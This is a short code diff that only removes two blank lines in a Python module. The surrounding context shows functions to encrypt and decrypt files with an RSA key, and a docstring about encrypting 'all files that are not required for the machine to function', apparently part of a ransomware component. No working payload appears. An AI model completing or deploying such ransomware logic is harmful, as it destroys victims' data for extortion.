@@ -165,7 +165,6 @@ def decrypt_file(filename, key):
         util.log("{} error: {}".format(decrypt_file.func_name, str(e)))
     return False
 
-
 def encrypt_files(args):
     """ 
     Encrypt all files that are not required for the machine to function
@@ -191,7 +190,6 @@ def encrypt_files(args):
             return "File '{}' does not exist".format(target)
     except Exception as e:
         util.log("{} error: {}".format(encrypt_files.func_name, str(e)))
-
 
 def decrypt_files(rsa_key):
     """ 
